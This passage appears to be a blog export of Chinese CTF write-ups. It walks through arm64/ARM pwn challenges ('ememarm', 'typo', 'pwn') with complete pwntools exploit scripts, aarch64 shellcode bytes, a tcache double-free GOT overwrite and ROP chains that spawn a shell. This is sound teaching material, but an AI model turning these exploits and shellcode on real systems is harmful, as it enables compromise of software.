[{"title":"HWS2021冬令营选拔赛","url":"/2021/02/03/hws2021-winter/","content":"\n一共是四道题目的wp：\n\n- emarm\n- ememarm\n- justcode\n- blinkblink\n\n后面三个题暂时以word的格式上传，等我有空把博客框架改完了再整理。\n\n# emarm\n\n见附件[emarm题解](emarm题解.docx)\n\n# ememarm\n\n## 分析\n\narm64二进制程序，动态链接，去符号表。\n\n```shell\n$ file ememarm\nememarm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=407173e699ec0b33c41ef419ba897062bcee5626, stripped\n```\n\ngot表可写，栈保护开了，开了NX（但用普通qemu-arm起起来的arm程序，这一项并不准确），未开随机化。\n\n```shell\n$ checksec ememarm\n[*] '/home/bling/ctf-0128/ememarm/ememarm'\n    Arch:     aarch64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n### 主要功能\n\n程序刚开始的时候，会malloc一个0x20大小的堆块，并让我们输入0x18大小的内容。这个堆块是用作头结点的，后面申请的堆块（note块）都会链接上来。\n\n```c\n  printf(\"hello every one welcom my note  ~~%lld\\n\", &unk_412070);\n  buf = malloc(0x20uLL);\n  read(0, buf, 0x18uLL);\n```\n\n程序主要是3个功能：\n\n```c\n__int64 sub_4008E4()\n{\n  puts(\"1. request\");\n  puts(\"2. print\");\n  puts(\"3. edit\");\n  return puts(\"you choice: \");\n}\n```\n\n#### request\n\n```c\n  buf = (char *)malloc(0x20uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n```\n\n申请0x20大小的堆块，写入两个8字节内容。写完后会让你选择是否delete，这时输入1，会将这个堆块链入头节点或者上一个请求的；输入其他数字默认不会链入。\n\n```c\n          puts(\"do you want delete?\");\n          __isoc99_scanf(\"%d\", &v2);\n          if ( v2 == 1 )\n            link_it(buf, v7);\n        }\n```\n\n#### print\n\nprint函数中没有任何有用的信息，至做了参数被写死的puts输出。\n\n这个函数被我用来当做调试的断点，很好用！\n\n#### edit\n\nedit函数中功能较多，问题也出在这儿。\n\n```c\nif ( (unsigned int)read(0, v5, 0x18uLL) == 24 )\n    *((_BYTE *)v5 + 24) = 0;\nfree(v5[3]);\nresult = (ssize_t)v5;\nv5[3] = 0LL;\n```\n\n第二行，将v5指向的地址当做BYTE类型，因此在赋值0时，只给最低1个byte置0了，这是一个off by null漏洞。导致后一行free操作并没有free预期的地址，产生了偏移，利用这个可以构造double free。题目给定的libc是有tcache的，这让我们的double free更好利用了。\n\n#### surprise\n\n除了以上这三个功能外，还有一个隐藏功能——surpise()。它存在的目的就是为了让我们可以构造多次double free。因为同一大小的tcache堆块链，只能构造一次double free。\n\n```shell\n  buf = (char *)malloc(0x30uLL);\n  puts(\"cx:\");\n  read(0, buf, 8uLL);\n  puts(\"cy:\");\n  read(0, buf + 8, 8uLL);\n  return buf;\n```\n\n### 关键点\n\n1. 通过链表寻找note块，因此可以劫持note块链的走向\n2. double free的同时，实现对next note的劫持。产生一次攻击，两个任意地址写的效果！\n\n## 利用\n\n### ret2shellcode\n\n> 由于arm pwn题通常是跑在qemu里的，qemu中默认不会有NX，因此大部分arm pwn都可以使用ret2shellcode的方法。\n\nshellcode植入的地址选择：比较随意，这里以.bss段后的0x412080作为shellcode起始地址。\n\n过程见如下exp\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nshellcode1 = \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\"\nshellcode2 = \"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\nshellcode3 = \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\"\nshellcode3 += \"\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\nshellcode3 += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nscanf_got = myelf.got['__isoc99_scanf']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - 包含\\x00项，利用‘\\x31’构造一个伪块，达到写next note地址的目的\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - 一次double free，可以构造两次任意地址写\nrequest_i(p64(0x412080),p64(0x0),0)\nrequest_i(p64(0x0),p64(0x412090),0)\nrequest_i(shellcode1,shellcode2,0)\t# 第一次写，将shellcode1和shellcode2(0x10 bytes)写到0x412080\n# one edit\nedit_i(4,shellcode3)\t#第二次写，将shellcode3（0x18 bytes）写到0x412090\n\n# re-init env : 0x20大小的note链经过上面的double free已经无法继续用了。所以需要重新初始化note链，使用题目中预留的0x30大小的note。这里需要通过调试定位各note的位置。\nedit_i(1,'2'*0x10)   # 1\nsuprise_i('1','1',1) # 2\nsuprise_i('1','1',1) # 3 - 包含\\x00项\nsuprise_i('1','1',1) # 4\nsuprise_i('1','1',1) # 5\nsuprise_i('1','1',1) # 6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc - 这里同样可以构造两次任意地址写，不过我们只需要写一次就够了\nsuprise_i(p64(scanf_got),p64(0x1),0)\nsuprise_i(p64(0x0),p64(0x0),0)\nsuprise_i(p64(0x412080),p64(0x412080),0)  # 将scanf的got表项写成了shellcode地址。surprise()执行过后，在执行`__isoc99_scanf(\"%d\", &v2)`时，由于scanf已被劫持，故将会跳转到我们的shellcode执行\n#print_i(1)  # debug\n\npr.interactive()\n```\n\n### execve(\"/bin/sh\",0,0)\n\n#### 一次泄露libc一次getshell\n\nprintf的第一个参数(格式化字符串)是一个地址，因此可以利用free(v[3])，将v[3]指向构造的格式化字符串，将free got表项改为printf的，就可以实现printf(v[3])泄露栈中跟libc相关的地址了。\n\n利用printf泄露栈中的libc_start_main函数地址：\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\nprintf_plt = myelf.plt['printf']\n\n\ninit_data = '%9$p'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# three malloc\nrequest_i(p64(0x412038),p64(0),0)       \nrequest_i(p64(0x0),p64(0x412038),0)     \nrequest_i(p64(printf_plt),'\\x68',0)\n\npr.recvuntil('you choice:')\npr.sendline(str(0x5))\n\npr.recvuntil(\"bye bye bye!!\\n\")\npr.recvline()\nstart_addr = pr.recv()[2:]\nstart_int = int(start_addr,base=16)\nlog.warn('libc_start_main+224: {:x}\\n'.format(start_int))\n\npr.interactive()\n```\n\n#### 泄露与getshell二合一\n\n泄露libc时只能泄露低32位，不过没关系，写会got表时找已经解析过的项，只需要将低32位填回去就可以了\n\n\n\n对于tcache而言，double free + three malloc可以达成一次任意地址写任意值。但是由于本题要泄露libc必须更改free的got表项，会导致后续无法再利用double free任意写，也就无法get shell。\n\n但是！本题中还有一个隐藏的不易被发现的任意地址写，那就是申请的note链表的next这个位置。通过错位释放note，再request，可以达到改next指针为目标地址的目的。然后再edit note时，输入的内容就会写入目标地址。\n\n以上两种方式都可以实现任意地址写，但是思考了很久，却始终无法通过线性组合达到get shell的目的。最后采用先free两次，再malloc两次（这个时候已经确定好下次malloc时堆管理器会分配给我的chunk了），利用两次edit（后一次还利用了off by null）实现free_got改为puts_plt并泄露setbuf的got表项从而得到libc的低32位。\n\n分析过程见下图：\n\n\n\nexp如下\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\nmyelf = ELF('./ememarm')\nmylibc = ELF('./lib/libc.so.6')\n#pr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\npr = process(['qemu-aarch64','-L','./','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\nscanf_got = myelf.got['__isoc99_scanf']\nputs_plt = myelf.plt['puts']\n\ninit_data = 'blingbling'\npr.sendafter(\"4268144\",init_data)\n\nrequest_i('1','1',1) #1\nrequest_i('1','1',1) #2\nrequest_i('1','\\x31',1) #3 - include \\x00 addr\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\n\n# double free\nedit_i(5,'1'*0x18)\nedit_i(4,'1'*0x18)\n# double free - two malloc\nrequest_i(p64(0x412000),p64(0),0)       # 提前布局利用double free要改写的地址，改malloc为gadget\nrequest_i(p64(0x0),p64(0x412038),0)     # 使note链中最后一个note指向free_got\n\n# two edit  - free(v5[3]) ==> puts(0x412000)\nedit_i(4,p64(puts_plt))\t\t\t\t\t# 更改链上最后一个note的值，即将free_got表项改为puts_plt\nedit_i(3,'a'*0x18)\t\t\t\t\t\t# 更改倒数第二个note的值，给其0x18字节，从而触发低字节写零，将v5[3]从0x412038变成0x412000，通过puts(0x412000)，我们可以得到setbuf表项(0x412000)中的实际地址。最后利用题目给定的libc，确定真实libc加载地址的后32位。（puts时由于\\x00截断，只能接收到低32位）《或者考虑使用printf搭配%p》\npr.recvline()   # 接收一个空行\naddr1 = pr.recvline()\nsetbuf_addr_32 = u32(addr1[:-1].ljust(4,'\\x00'))\nbase_addr_32 = setbuf_addr_32 - mylibc.symbols['setbuf']   # 计算libc\nget_shell_addr = base_addr_32 + 0x63e80         # one gadget = 0x63e80\n\n# double free - last malloc\nrequest_i('\\x08',p32(get_shell_addr),0)     #double free中的第三次malloc，实现任意地址写任意值。将malloc的got表项写成get shell的gadget，只写低32位。同时最好保持前一项不变，通过题目给的libc可以确定前一项的最低一个字节是'\\x08'\n\npr.recvuntil('you choice:')\npr.sendline(str(0x1))\t\t\t\t# 触发request中的malloc\n# print_i(1)  \t\t\t\t\t\t# debug\npr.interactive()\n```\n\n### backup\n\n另一种方法实现两次任意地址写：利用0x20和0x30的链各double free一次，加上错位构造chunk的一次，一共有四次任意地址写任意值的能力。\n\n```python\nfrom pwn import *\ncontext(arch = 'aarch64',log_level='debug')\n\npr = process(['qemu-aarch64','-L','./','-g','1234','./ememarm'])\n\ndef request_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x1))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n\ndef print_i(index):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x2))\n    pr.sendline(str(index))\n\ndef edit_i(index,content):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x3)) \n    pr.sendline(str(index))\n    pr.send(content)\n\ndef suprise_i(cx,cy,dlt=1):\n    pr.recvuntil('you choice:')\n    pr.sendline(str(0x4))\n    pr.recvuntil('cx:')\n    pr.send(cx)\n    pr.recvuntil('cy:')\n    pr.send(cy)\n    pr.recvuntil('delete?')\n    pr.sendline(str(dlt))\n    \ninit_data = 'a'*8 + 'b'*8 + 'c'*8\npr.sendafter(\"4268144\",init_data)\n\nsuprise_i('1','1',1) #1\nrequest_i('1','1',1) #2\n\nrequest_i('1','1',1) #3\nrequest_i('1','1',1) #4\nrequest_i('1','1',1) #5\nsuprise_i('1','1',1) #6\nrequest_i('1','1',1) #7\n\nsuprise_i('1','1',1) #8\nrequest_i('1','1',1) #9\nrequest_i('1','1',1) #10\nrequest_i('1','1',1) #11\nrequest_i('1','1',1) #12\n\nprint_i(1)\nedit_i(11,'1'*0x18)\nedit_i(10,'2'*0x18)\nsuprise_i(p64(0x412078),'1',1)      # mylibc.got['free'] : 0x412038  # .bss after : 0x412080\nsuprise_i('\\x78','1',0)        # x - \\x78 - 0x412078\nsuprise_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nedit_i(5,'3'*0x18)\nedit_i(4,'3'*0x18)\nrequest_i(p64(0x412088),'1',1)\nrequest_i('\\x88','1',0)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\n\nrequest_i(p64(0x412088),'1',1)\nrequest_i('1'*8,'1',0)\nprint_i(1)\nrequest_i(\"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\",\"\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\",0)\nprint_i(1) \n\npr.interactive()\n```\n\n\n\n# justcode\n\n见附件[justcode题解](justcode题解.docx)\n\n\n\n# blinkblink\n\n见附件[blinkblink题解](blinkblink题解.docx)","categories":["CTF"]},{"title":"arm pwn入门","url":"/2021/01/27/arm-pwn-start/","content":"\n# qemu调试arm用户态程序\n\n```shell\n# 使用qemu-arm将程序运行起来，并指定一个端口用于连接gdb\nqemu-arm -g xxx ./arm-bin\n\n# 使用gdb-multiarch指定arm程序\ngdb-multiarch ./arm-bin\ngef> set architecture arm\ngef> set endian little\ngef> target remote :xxx\n```\n\n调试mips程序的设置也类似\n\n```shell\n# 启动mips应用程序，并指定调试端口\nqemu-mips -g xxx ./mips-bin\nqemu-mips -g xxx -L ./ ./mips-bin  # 使用-L指定包含动态库的lib/目录\n\n# gdb-multiarch启动调试\ngdb-multiatch ./mips-bin\ngef> set architecture mips\ngef> set endian big\ngef> target remote :xxx\n```\n\n# 练习题 - typo\n\n[typo](typo)\n\n查看文件属性，arm32位可执行程序，静态连接，去符号表。\n\n查看编译选项，栈无canary但栈不可执行，程序未开启随机化故加载基址固定。\n\n```shell\nbling@Ubuntu2004:~/ctf$ file ./typo\n./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\nbling@Ubuntu2004:~/ctf$ checksec --file=./typo\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\t\nPartial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH \nSymbols\t\tFORTIFY\tFortified\tFortifiable  FILE\nNo Symbols      No\t0\t\t0\t./typo\n```\n\n通过start()函数或关键字符串的交叉引用来寻找main()函数。\n\n- start函数中LDR R0,=sub_8F00中的sub_8F00就是main函数\n\n  ```shell\n  .text:00008BB4                 PUSH    {R12}\n  .text:00008BB8                 LDR     R0, =sub_8F00\n  .text:00008BBC                 LDR     R3, =0xA5EC\n  .text:00008BC0                 BL      sub_9EBC\n  .text:00008BC4                 BL      sub_F0E0\n  .text:00008BC4 ; End of function start\n  ```\n\n- 关键字符串，如运行时打印的`Let's Do Some Typing Exercise~`，在IDA中寻找对该字符串的引用\n\n## 题目分析\n\n对于这种输入类的题，首先想到的是输入一个超长字符串看程序会不会崩。果然崩掉了。\n\n```shell\n$ qemu-arm ./typo\nLet's Do Some Typing Exercise~\nPress Enter to get start;\nInput ~ if you want to quit\n\n------Begin------\nconsequently\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nqemu: uncaught target signal 11 (Segmentation fault) - core dumped\nSegmentation fault (core dumped)\n```\n\n使用gdb-multiarch调试一下崩溃位置，是否覆盖了返回地址\n\n- qemu-arm侧\n\n  ```shell\n  $ qemu-arm -g 1234 ./typo\n  ```\n\n- gdb-multiarch侧\n\n  ```shell\n  $ gdb-multiarch ./typo\n  GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1\n  pwndbg> set architecture arm\n  The target architecture is assumed to be arm\n  pwndbg> set endian little\n  The target is assumed to be little endian\n  pwndbg> target remote :1234\n  Remote debugging using :1234\n  ```\n\n  这里在gdb内设置的set和target remote都可以写在一个配置文档里，通过`gdb-multiarch -x abc.cfg`指定。\n\n- pwntools生成字符串pattern\n\n  ```shell\n  >>> from pwn import *\n  >>> cyclic(200)\n  'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'\n  ```\n\n接下来：\n\n1. gdb-multiarch内执行`c`\n\n2. qemu-arm界面，回车后，将上述200个字符输入\n\n3. 回到gdb-multiarch界面，可以看到如下寄存器信息，PC指针被我们的输入覆盖了\n\n   ```shell\n   ─────────────────────────────────[ REGISTERS ]──────────────────────────────────\n    R0   0x0\n   *R1   0xfffeeed4 ◂— 0x61616161 ('aaaa')\n   *R2   0x7e\n    R3   0x0\n   *R4   0x62616162 ('baab')\n    R5   0x0\n    R6   0x0\n    R7   0x0\n    R8   0x0\n   *R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}\n   *R10  0xa68c ◂— push   {r3, r4, r5, lr}\n   *R11  0x62616163 ('caab')\n    R12  0x0\n   *SP   0xfffeef48 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\\n'\n   *PC   0x62616164 ('daab')\n   ```\n\n4. 在pwntools中确定`'daab'`的偏移量，为112\n\n   ```sh\n   >>> cyclic_find('daab')\n   112\n   ```\n\n5. 因此，我们通过padding 112个字符，就能覆盖函数返回地址，劫持控制流\n\n## 三种利用方法\n\n### ret2shellcode\n\n> [现成的shellcode](http://shell-storm.org/shellcode/)\n\n### rop - svc\n\n> svc：id=0xb；R0=addr(\"/bin/sh\")；R1=0；R2=0 \n>\n> 以上系统调用等同于execve(\"/bin/sh\",0,0)\n\n找到`/bin/sh`字符串地址：\n\n```shell\n$ ROPgadget --binary ./typo --string /bin/sh\nStrings information\n============================================================\n0x0006c384 : /bin/sh\n```\n\n找ropgadget：\n\n```shell\n$ ROPgadget --binary ./typo --only \"pop\"\nGadgets information\n============================================================\n0x00008d1c : pop {fp, pc}\n0x00020904 : pop {r0, r4, pc}\n0x00068bec : pop {r1, pc}\n0x00008160 : pop {r3, pc}\n0x0000ab0c : pop {r3, r4, r5, pc}\n0x0000a958 : pop {r3, r4, r5, r6, r7, pc}\n0x00008a3c : pop {r3, r4, r5, r6, r7, r8, fp, pc}\n0x0000a678 : pop {r3, r4, r5, r6, r7, r8, sb, pc}\n0x00008520 : pop {r3, r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00068c68 : pop {r3, r4, r5, r6, r7, r8, sl, pc}\n0x00014a70 : pop {r3, r4, r7, pc}\n0x00008de8 : pop {r4, fp, pc}\n0x000083b0 : pop {r4, pc}\n0x00008eec : pop {r4, r5, fp, pc}\n0x00009284 : pop {r4, r5, pc}\n0x000242e0 : pop {r4, r5, r6, fp, pc}\n0x000095b8 : pop {r4, r5, r6, pc}\n0x000212ec : pop {r4, r5, r6, r7, fp, pc}\n0x000082e8 : pop {r4, r5, r6, r7, pc}\n0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}\n0x00011648 : pop {r4, r5, r6, r7, r8, pc}\n0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}\n0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}\n0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}\n0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}\n0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}\n0x00023ed4 : pop {r4, r5, r7, pc}\n0x00023dbc : pop {r4, r7, pc}\n0x00014068 : pop {r7, pc}\n\nUnique gadgets found: 29\n```\n\n找`svc`：\n\n```shell\n$ ROPgadget --binary ./typo | grep 'svc #0'\n0x0001aca8 : svc #0 ; pop {r4, r5, r6, r7, r8, pc}\n0x00019568 : svc #0 ; pop {r4, r5, r6, r7, r8, sb, pc}\n0x000482fc : svc #0 ; pop {r7} ; bx lr\n0x00048310 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x000482fc : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n0x00048324 : svc #0 ; pop {r7} ; bx lr ; str r7, [sp, #-4]! \n......\n```\n\n找`mov`指令：\n\n```shell\n$ ROPgadget --binary ./typo | grep 'mov r2, r4'\n0x0003338c : mov r2, r4 ; blx r3\n0x0000f600 : mov r2, r4 ; blx sb\n0x00069950 : mov r2, r4 ; mov r3, r4 ; blx r8\n0x00013310 : mov r2, r4 ; mov r3, r5 ; blx r1\n......\n```\n\n我们的最终目标是：\n\n- R0 = \"/bin/sh\"\n- R1 = 0\n- R2 = 0\n- R7 = 0xb （对应arm下execve的系统调用）\n- Rx = svc\n\n根据目标，构造了如下rop链：\n\n```shell\ng1 - 0x00020904 : pop {r0, r4, pc}\ng2 - 0x00068bec : pop {r1, pc}\ng3 - 0x00023dbc : pop {r4, r7, pc}\ng4 - 0x00008160 : pop {r3, pc}\ng5 - 0x0003338c : mov r2, r4 ; blx r3\n====stack high====\ng5\n0x0001aca8\t\t# \"svc\"地址\ng4\n0xb\n0\ng3\n0\ng2\n0\n0x0006c384\t\t# \"/bin/sh\"字符串地址\ng1\n====stack low====\n```\n\n以上rop链对应的payload为：\n\n```shell\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\n```\n\n完整exp如下：\n\n```shell\nfrom pwn import *\ncontext(arch='arm',log_level='debug')\n\nmyproc = process(['qemu-arm','./typo'])\n\nmyproc.recvuntil(\"quit\\n\")\nmyproc.send(\"\\n\")\n\npayload = p32(0x00020904)+p32(0x0006c384)+p32(0)+p32(0x00068bec)+p32(0)+p32(0x00023dbc)+p32(0)+p32(0xb)+p32(0x00008160)+p32(0x0001aca8)+p32(0x0003338c)\nexp = 'a'*112 + payload\n\nmyproc.recv()\nmyproc.sendline(exp)\n\nmyproc.interactive()\n```\n\n### rop - func(\"/bin/sh\")\n\n> system(\"/bin/sh\") 或者 execve(\"/bin/sh\",0,0)\n>\n> 使用类似pop {r0,pc}的gadget，实现对r0（第一个参数）和pc的控制，从而劫持控制流到**system(\"/bin/sh\")**\n\n# 练习题 - pwn\n\n## 安装arm64的lib库\n\n```shell\nsudo apt search \"libc6-\" | grep \"arm\"\nsudo apt install libc6-arm64-cross\n# 安装好的库/usr/aarch64-linux-gnu/lib/目录下\n```\n\n`qemu-aarch64`执行时通过`-L`指定`/usr/aarch64-linux-gnu`目录即可，如：\n\n```shell\nqemu-aarch64 -L /usr/aarch64-linux-gnu ./pwn\n```\n\n## 题目分析\n\n[pwn](pwn)\n\n查看文件属性、IDA逆向二进制文件分析后，调试结果如下：\n\n- 程序有两次输入。第一次输入将被放到bss段，限制了输入大小为0x200。这里没有问题。\n\n- 第二次输入时，将输入0x200字节的数据给栈上的局部变量。如下所示，明显的栈溢出。\n\n  ```c\n  ssize_t sub_4007F0()\n  {\n    __int64 v1; // [xsp+10h] [xbp+10h] BYREF\n  \n    return read(0, &v1, 0x200uLL);\n  }\n  ```\n\n- 因此尝试调试输入超长字符串是否能成功覆盖返回地址，劫持pc指针。如下证明输入确实控制了pc。\n\n  ```shell\n  ─────────────────────────────────[ REGISTERS ]──────────────────────────────────\n   X0   0x0\n  *X1   0x40007ffdb0 ◂— 0x6161616261616161 ('aaaabaaa')\n  *X2   0x200\n  *X3   0x40009a21a8 ◂— 0x0\n   X4   0x0\n   X5   0x0\n  *X6   0x400099eb00 ◂— 0x0\n  *X7   0x4000000000\n  *X8   0x3f\n  *X9   0xffffffffffff\n  *X10  0x101010101010101\n   X11  0x0\n   X12  0x0\n  *X13  0x400082e048 —▸ 0x400082f1b0 ◂— 0x0\n  *X14  0x400085a308 ◂— 0x70737274735f5f00\n  *X15  0x400084ce08 ◂— 0x0\n  *X16  0x411028 —▸ 0x400090b9c8 ◂— 0xb0000483a9bd7bfd\n  *X17  0x400090b9c8 ◂— 0xb0000483a9bd7bfd\n  *X18  0x367\n  *X19  0x400868 ◂— stp    x29, x30, [sp, #-0x40]!\n   X20  0x0\n  *X21  0x400610 ◂— movz   x29, #0\n   X22  0x0\n   X23  0x0\n   X24  0x0\n   X25  0x0\n   X26  0x0\n   X27  0x0\n   X28  0x0\n  *X29  0x6161617261616171 ('qaaaraaa')\n  *SP   0x40007ffe00 ◂— 'uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaac\\n'\n  *PC   0x6161617461616173 ('saaataaa')\n  ```\n\n- 确定偏移量，为72\n\n  ```shell\n  >>> cyclic_find('saaa')\n  72\n  ```\n\n## 利用\n\n### 标准qemu上\n\n**ret2shellcode**\n\n```python\nfrom pwn import *\ncontext(log_level='debug',arch='aarch64')\nio = process([\"qemu-aarch64\", \"-L\", \"/usr/aarch64-linux-gnu\",\"./pwn\"])\n\npayload =  \"\\xe1\\x45\\x8c\\xd2\\x21\\xcd\\xad\\xf2\\xe1\\x65\\xce\\xf2\\x01\\x0d\\xe0\\xf2\"\npayload += \"\\xe1\\x8f\\x1f\\xf8\\xe1\\x03\\x1f\\xaa\\xe2\\x03\\x1f\\xaa\\xe0\\x63\\x21\\x8b\"\npayload += \"\\xa8\\x1b\\x80\\xd2\\xe1\\x66\\x02\\xd4\"\n\nio.sendlineafter(\"Name\",payload)\nio.sendline(b'a'*72+p64(0x411068))\nio.interactive()\n```\n\n[shellcode来源](https://www.exploit-db.com/shellcodes/47048)\n\n### 补丁qemu上\n\n补丁qemu上，bss段不可执行。考虑使用`mprotect()` 函数将bss段设置为可读可写可执行。\n\n```c\n#include <unistd.h>\n#include <sys/mmap.h>\nint mprotect(const void *start, size_t len, int prot);\n// 把自start开始的、长度为len的内存区的保护属性修改为prot指定的值\n// 